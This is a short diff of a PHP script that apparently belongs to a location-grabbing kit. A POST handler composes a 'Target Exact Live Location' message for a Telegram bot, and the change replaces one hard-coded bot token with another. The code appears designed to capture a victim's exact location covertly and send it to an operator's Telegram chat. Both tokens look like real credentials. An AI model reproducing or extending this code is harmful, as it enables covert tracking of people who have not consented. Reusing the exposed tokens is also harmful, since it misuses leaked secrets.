@@ -45,7 +45,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <b>🗺 Target Exact Live Location 👇</b>";
 
     // Telegram Bot Token and Chat ID
-    $token = "8090590898:AAF1uFEwi_o64gyeauGBgh9i0pFQMUeWl0w"; // Replace with your actual token
+    $token = "7439126262:AAENuqrwJjlH7_KGLXWfyMRh5-OefNII9qA"; // Replace with your actual token
 
     // URL encode the message
     $encoded_message = urlencode($message);
